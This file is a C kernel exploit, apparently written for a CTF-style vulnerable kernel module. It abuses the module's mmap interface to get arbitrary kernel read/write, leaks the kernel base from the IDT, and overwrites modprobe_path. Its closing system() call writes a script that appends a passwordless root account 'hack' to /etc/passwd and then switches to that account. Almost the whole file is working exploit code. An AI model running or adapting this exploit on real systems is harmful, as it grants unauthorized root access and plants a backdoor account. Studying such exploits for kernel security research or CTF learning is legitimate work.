// gcc exploit_lkm.c -masm=intel -o exploit_lkm

#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>
#include <sys/mman.h>

static void dump(void *buf, size_t size);

/* exploit */
#define __START_KERNEL_map  0xffffffff80000000
#define TEXT_BASE           0xffffffff81000000
#define OFFSET(addr)	((addr) - (TEXT_BASE))
#define ADDR(offset)	(kernel_base + (offset))
#define ADDR_IDT            0xfffffe0000000000

uintptr_t kernel_base = 0;
const uint64_t ofs_asm_exc_divide_error  = OFFSET(0xffffffff816008b0);
const uint64_t ofs_modprobe_path         = OFFSET(0xffffffff81a38da0);

struct gate_struct {
	uint16_t offset_low;
	uint16_t segment;
	uint16_t bits;
	uint16_t offset_middle;
	uint32_t offset_high;
	uint32_t reserved;
} __attribute__((packed));

int main(int argc, char *argv[]){
	int fd;

	if(argc < 2){
		printf("Usage: %s <file path>\n", argv[0]);
		return -1;
	}

	if((fd = open(argv[1], O_RDWR)) < 0){
		perror("open");
		return -1;
	}

	uint64_t *p;
	if((p = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 1<<21)) == MAP_FAILED){
		perror("mmap");
		return -1;
	}
	p[0] = 0xdeadbeef;
	munmap(p, 0x1000);

	lseek(fd, 0, SEEK_SET);
	write(fd, (uint64_t[]){0xdeadbeef}, sizeof(uint64_t));

	/*
	uint64_t addr_page;
	lseek(fd, 1<<21, SEEK_SET);
	read(fd, &addr_page, 8);

	printf("[+] addr_page    = %p\n", (void*)addr_page);
	 */

	if((p = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 1<<21)) == MAP_FAILED){
		perror("mmap");
		return -1;
	}

	ssize_t aar(void *dst, uintptr_t addr, size_t len) {
		p[0] = addr & ~((1<<12)-1);
		return pread(fd, dst, len, addr & ((1<<12)-1));
	}

	ssize_t aaw(uintptr_t addr, void *src, size_t len) {
		p[0] = addr & ~((1<<12)-1);
		return pwrite(fd, src, len, addr & ((1<<12)-1));
	}

	struct gate_struct idt;
	aar(&idt, ADDR_IDT, sizeof(idt));

	uintptr_t adr_asm_exc_divide_error = ((uint64_t)idt.offset_high << 32) + ((uint32_t)idt.offset_middle << 16) + idt.offset_low;
	kernel_base = adr_asm_exc_divide_error - ofs_asm_exc_divide_error;
	printf("[+] kernel_base  = %p\n", (void*)kernel_base);

	char new_mp[] = "/tmp/mp";
	aaw(ADDR(ofs_modprobe_path), new_mp, sizeof(new_mp));

	p[0] = 0;
	munmap(p, 0x1000);
	close(fd);

	system(
		"cd /tmp;"
		"echo -ne '#!/bin/sh\necho hack::0:0::/root:/bin/sh >> /etc/passwd\n' > mp;" 
		"echo -ne '\\xff\\xff\\xff\\xff' > a;"
		"chmod +x mp a;" 
		"./a;"
		"exec su - hack"
	);

	return 0;
}

/* utils */
static void dump(void *buf, size_t size){
	uint64_t *p = buf;

	printf("=== DUMP (%p-%p) ===\n", buf, buf+size);
	for(uint64_t i=0; i<size/8; i++){
		printf("%016lx ", p[i]);
		if(i%4 == 3)
			printf("\n");
	}
	printf("\n");
}

